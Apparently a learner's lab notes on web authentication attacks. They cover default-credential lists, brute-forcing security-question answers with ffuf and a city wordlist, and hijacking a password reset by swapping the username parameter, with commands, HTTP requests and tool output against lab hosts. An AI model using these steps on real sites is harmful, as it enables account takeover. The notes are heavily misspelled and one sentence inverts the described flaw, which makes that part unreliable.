# Default credentials:
Many We app are set up def credentials to allow accessingf after installation, these credentials need to be changed after installation.
Change after the initial setup of the we app, they provide an ez way to for attackers to obtain authenticated access.
Testing for def credentials is a essential part of auth testing  OWASP's Web App Security Testing Guide.
Common default credentials include [admin and password].

- Testing Default Credentials:
Many plataforms provide listis of def credentials for a wide variaty of web app, IS the web database maintained by [CIRT.net](https://www.cirt.net/passwords). if we identified a Cisco device during a penetration test, we can search the db for def credentials for cisco device.
Futher resources include Sellist Def credentials as well as the [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master) respository wich contain a list of def pass for variaty diff vendors.

## Vulnerable Password reset:
- Guesseable Password Reset Questions:
Web app aith user who have lost their pass by requesting that they answer ne or multiple security questions, Users provide answares to predefine and generic security questions, disallowing users for entering customs ones.
The same web app, the security of all users wull be the same, allowing attakers to abuste them.

Assuming we had  found such funcionality on a target website, we should try abusing it to bypass aithentication, the weak link in a question-based pass reset funcionality us the predictability of the answars. It's common to find questions
like he following:
- What is ir mother maiden name?
- What city werw u born in?

We can attempt to brute-forvvce teh answare to this questions by using a proper wordlist, there are multiple containing large cities in the world. This [CSV](https://github.com/datasets/world-cities/blob/main/data/world-cities.csv) file
cotains a list of mor than 25000 cities with more then 15000 inhabitants from all over the world.
SInce the CSV fiel contains he city name in the first field, we can create our wordlist containing only the city name on the each line using the following command:
```sh
cat wordl-cities.csv | cut -d ',' -f1 > city_wordlist.txt
wc -l city_wordlist.txt

```
We will target the user admin, after specifying the userneme, we must answare the user's security questions. The corresponding requests looks...
We can set up the corresponding ffuf command form this request to brute-force the answare, keep in mind that we need to specify our session cookie
to associate our request witht the username admin we specify in prev step.

`ffuf -w ./city_wordlist -u [ip] -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."`

We could narrow down the cities if we had additional information on our target to reduce time requeired for our brute-force attack on the security questions, if we knew that our target user was form Germany, we could create a wordlist
containig only german cities with this commands:
`cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt `

- Manipulatiing the Reset Request:
Another instance of a flawed pass reset logic occurs when a user can manipulate a potentially hidden parameter to reset the pass of a diff acc.
Ww will use our demo account htb-stdnt, which results in the following requests:
```js
POST /reset.php HTTP/1.1
Host: pwreset.htb
Content-Length: 18
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

username=htb-stdnt
```
Supplying the security response London results in the following request:
```js
POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

security_response=London&username=htb-stdnt
```
The final request looks like:
```js
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=htb-stdnt
```
Suppose the web app does properly verifu that the username in both request match, we can skip the security question or supply the answare to our security questiona nt then set the pass of an entirely different account.
```sh
ffuf -w city_wordlist.txt -u http://94.237.58.95:43537/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b PHPSESSID=fpdk5sheb6cnstlsjc7d37t3s9  -d "security_response=FUZZ" -fr "Incorrect response."

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.58.95:43537/security_question.php
 :: Wordlist         : FUZZ: /home/Anchovy/city_wordlist.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: PHPSESSID=fpdk5sheb6cnstlsjc7d37t3s9
 :: Data             : security_response=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Incorrect response.
________________________________________________

Manchester              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
```

